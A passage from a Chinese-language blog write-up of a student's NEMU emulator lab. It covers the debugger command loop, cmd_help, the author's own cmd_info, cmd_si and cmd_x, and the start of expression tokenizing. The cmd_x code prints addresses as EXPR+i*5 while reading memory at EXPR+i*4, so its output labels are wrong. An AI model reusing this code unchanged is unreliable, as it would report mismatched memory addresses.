*cmd = strtok(str, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd == <span class="literal">NULL</span>) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">    <span class="keyword">char</span> *args = cmd + <span class="built_in">strlen</span>(cmd) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (args &gt;= str_end) &#123;</span><br><span class="line">      args = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAS_IOE</span></span><br><span class="line">    <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">sdl_clear_event_queue</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    sdl_clear_event_queue();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, cmd_table[i].name) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd_table[i].handler(args) &lt; <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == NR_CMD) &#123; <span class="built_in">printf</span>(<span class="string">&quot;Unknown command &#x27;%s&#x27;\n&quot;</span>, cmd); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_batch_mode) &#123;</span><br><span class="line">  cmd_c(<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 如果你的执行参数是-b，</span></span><br><span class="line"><span class="comment"> * 则在parse_args函数中会将is_batch_mode的值修改为true，</span></span><br><span class="line"><span class="comment"> * 否则将是默认的false。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_c</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  cpu_exec(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 赋值无符号-1，也就是64位最大数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (nemu_state.state) &#123;</span><br><span class="line">    <span class="keyword">case</span> NEMU_END: <span class="keyword">case</span> NEMU_ABORT:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Program execution has ended. To restart the program, exit NEMU and run again.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>: nemu_state.state = NEMU_RUNNING;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 检测程序是否执行完毕或者中止，如果执行完了就返回。</span></span><br><span class="line">  <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --) &#123;</span><br><span class="line">    __attribute__((unused)) <span class="keyword">vaddr_t</span> ori_pc = cpu.pc;</span><br><span class="line">    __attribute__((unused)) <span class="keyword">vaddr_t</span> seq_pc = exec_once();</span><br><span class="line"><span class="comment">// 取指令 执行</span></span><br><span class="line"><span class="comment">// 下面的暂时略过</span></span><br></pre></td></tr></table></figure><p>解析参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">char</span> *str; (str = rl_gets()) != <span class="literal">NULL</span>; ) &#123;</span><br><span class="line">  <span class="keyword">char</span> *str_end = str + <span class="built_in">strlen</span>(str);</span><br><span class="line">  <span class="keyword">char</span> *cmd = strtok(str, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmd == <span class="literal">NULL</span>) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">  <span class="keyword">char</span> *args = cmd + <span class="built_in">strlen</span>(cmd) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (args &gt;= str_end) &#123;</span><br><span class="line">    args = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 进入nemu界面之后，读取指令和参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAS_IOE</span></span><br><span class="line">    <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">sdl_clear_event_queue</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    sdl_clear_event_queue();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, cmd_table[i].name) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd_table[i].handler(args) &lt; <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == NR_CMD) &#123; <span class="built_in">printf</span>(<span class="string">&quot;Unknown command &#x27;%s&#x27;\n&quot;</span>, cmd); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解析并执行指令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">rl_gets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> *line_read = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (line_read) &#123;</span><br><span class="line">    <span class="built_in">free</span>(line_read);</span><br><span class="line">    line_read = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  line_read = readline(<span class="string">&quot;(nemu) &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (line_read &amp;&amp; *line_read) &#123;</span><br><span class="line">    add_history(line_read);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> line_read;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// readline返回函数地址，然后存储在line_read里。*line_read里是字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="keyword">char</span> *description;</span><br><span class="line">  <span class="keyword">int</span> (*handler) (<span class="keyword">char</span> *);</span><br><span class="line">&#125; cmd_table [] = &#123;</span><br><span class="line">  &#123; <span class="string">&quot;help&quot;</span>, <span class="string">&quot;Display informations about all supported commands&quot;</span>, cmd_help &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;c&quot;</span>, <span class="string">&quot;Continue the execution of the program&quot;</span>, cmd_c &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Exit NEMU&quot;</span>, cmd_q &#125;,</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more commands */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="cmd-help"><a href="#cmd-help" class="headerlink" title="cmd_help"></a>cmd_help</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_help</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *arg = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="comment">// 第二次调用strtok时可以使用null继续上次的执行</span></span><br><span class="line"><span class="comment">// 这里用于查看是否有参数</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, cmd_table[i].name) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unknown command &#x27;%s&#x27;\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于else后面的代码，用实现来看会更加直观一点</p><p><img src="https://i.loli.net/2021/06/29/AP2ulJX4ZqFjomM.png" alt="image-20210629220924397"></p><h3 id="作业2"><a href="#作业2" class="headerlink" title="作业2"></a>作业2</h3><p><strong>实现cmd_info</strong></p><p>首先在头文件<code>nemu\include\nemu.h</code>中声明isa_reg_display函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NEMU_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NEMU_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;memory/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;isa/reg.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> CPU_state cpu;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">isa_reg_display</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后在<code>nemu\src\monitor\debug\ui.c</code>实现<code>cmd_info</code>函数(记得在前面声明)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_info</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (args == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the info r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">char</span> *arg = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>)!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Too many parameters\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, <span class="string">&quot;r&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Info is imperfect\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的声明将不会再举例子</p><p><img src="https://i.loli.net/2021/06/30/deMHKoJr63UFWsl.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">isa_reg_display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;EAX:0x%x\n&quot;</span>,cpu.eax);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ECX:0x%x\n&quot;</span>,cpu.ecx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;EDX:0x%x\n&quot;</span>,cpu.edx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;EBX:0x%x\n&quot;</span>,cpu.ebx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ESP:0x%x\n&quot;</span>,cpu.esp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;EBP:0x%x\n&quot;</span>,cpu.ebp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ESI:0x%x\n&quot;</span>,cpu.esi);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;EDI:0x%x\n&quot;</span>,cpu.edi);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>cmd_si</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_si</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (args == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    cpu_exec(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> step = atoi(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>));</span><br><span class="line">  <span class="keyword">if</span>(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>)!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Too many parameters\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (step&lt;=<span class="number">0</span> || step &gt;=<span class="number">999</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong parameter\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cpu_exec(step);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>cmd_x</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_x</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (args == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No parameters\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> count = atoi(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (count==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong parameter1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">char</span>* EXPR_BUFFER = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (EXPR_BUFFER==<span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong parameter2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> EXPR = strtol(EXPR_BUFFER,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> (EXPR==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong parameter2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>)!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Too many parameters\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;count; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x:    0x%x\n&quot;</span>, EXPR+i*<span class="number">5</span>, paddr_read(EXPR+i*<span class="number">4</span>, <span class="number">4</span>)); <span class="comment">//修改count为表达式</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/02/z9DlECjBVqkpSPW.png" alt="image-20210702113206980"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> </span></span><br><span class="line"><span class="function">  <span class="title">paddr_read</span><span class="params">(<span class="keyword">paddr_t</span> addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (map_inside(&amp;pmem_map, addr)) &#123;</span><br><span class="line">    <span class="comment">// 判断地址是否是物理地址，是的话进入if循环</span></span><br><span class="line">    <span class="keyword">uint32_t</span> offset = addr - pmem_map.low;</span><br><span class="line"><span class="comment">// 计算偏移</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span> *)(pmem + offset) &amp; (~<span class="number">0u</span> &gt;&gt; ((<span class="number">4</span> - len) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// 输出字节的长度</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map_read(addr, len, fetch_mmio_map(addr));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> IOMap pmem_map = &#123;</span><br><span class="line">  .name = <span class="string">&quot;pmem&quot;</span>,</span><br><span class="line">  .space = pmem,</span><br><span class="line">  .callback = <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">map_inside</span><span class="params">(IOMap *<span class="built_in">map</span>, <span class="keyword">paddr_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (addr &gt;= <span class="built_in">map</span>-&gt;low &amp;&amp; addr &lt;= <span class="built_in">map</span>-&gt;high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">map_read</span><span class="params">(<span class="keyword">paddr_t</span> addr, <span class="keyword">int</span> len, IOMap *<span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">  assert(len &gt;= <span class="number">1</span> &amp;&amp; len &lt;= <span class="number">4</span>);</span><br><span class="line">  check_bound(<span class="built_in">map</span>, addr);</span><br><span class="line">  <span class="keyword">uint32_t</span> offset = addr - <span class="built_in">map</span>-&gt;low;</span><br><span class="line">  invoke_callback(<span class="built_in">map</span>-&gt;callback, offset, len, <span class="literal">false</span>); <span class="comment">// prepare data to read</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> data = *(<span class="keyword">uint32_t</span> *)(<span class="built_in">map</span>-&gt;space + offset) &amp; (~<span class="number">0u</span> &gt;&gt; ((<span class="number">4</span> - len) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">IOMap* <span class="title">fetch_mmio_map</span><span class="params">(<span class="keyword">paddr_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mapid = find_mapid_by_addr(maps, nr_map, addr);</span><br><span class="line">  <span class="keyword">return</span> (mapid == <span class="number">-1</span> ? <span class="literal">NULL</span> : &amp;maps[mapid]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-表达式求值"><a href="#5-表达式求值" class="headerlink" title="5.)表达式求值"></a>5.)表达式求值</h2><p><strong>首先识别出表达式中的单元，然后根据表达式的归纳定义进行递归求值。</strong></p><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>词法分析就是识别出表达式中有独立含义的子串，它们也被称为token。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NR_REGEX (sizeof(rules) / sizeof(rules[0]) )</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  TK_NOTYPE = <span class="number">256</span>, TK_DEC, TK_NEG</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *regex;</span><br><span class="line">  <span class="keyword">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line">  &#123;<span class="string">&quot;[0-9]+&quot;</span>, TK_DEC&#125;,     <span class="comment">// dec</span></span><br><span class="line">  &#123;<span class="string">&quot; +&quot;</span>, TK_NOTYPE&#125;,      <span class="comment">// spaces</span></span><br><span class="line">  &#123;<span class="string">&quot;\\*&quot;</span>, <span class="string">&#x27;*&#x27;</span>&#125;,           <span class="comment">// mul</span></span><br><span class="line">  &#123;<span class="string">&quot;/&quot;</span>, <span class="string">&#x27;/&#x27;</span>&#125;,             <span class="comment">// div</span></span><br><span class="line">  &#123;<span class="string">&quot;\\(&quot;</span>, <span class="string">&#x27;(&#x27;</span>&#125;,           <span class="comment">// bra1</span></span><br><span class="line">  &#123;<span class="string">&quot;\\)&quot;</span>, <span class="string">&#x27;)&#x27;</span>&#125;,           <span class="comment">// bra2</span></span><br><span class="line">  &#123;<span class="string">&quot;-&quot;</span>, <span class="string">&#x27;-&#x27;</span>&#125;,             <span class="comment">// sub</span></span><br><span class="line">  &#123;<span class="string">&quot;\\+&quot;</span>, <span class="string">&#x27;+&#x27;</span>&#125;,           <span class="comment">// plusd</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">regex_t</span> re[NR_REGEX] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_regex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> error_msg[<span 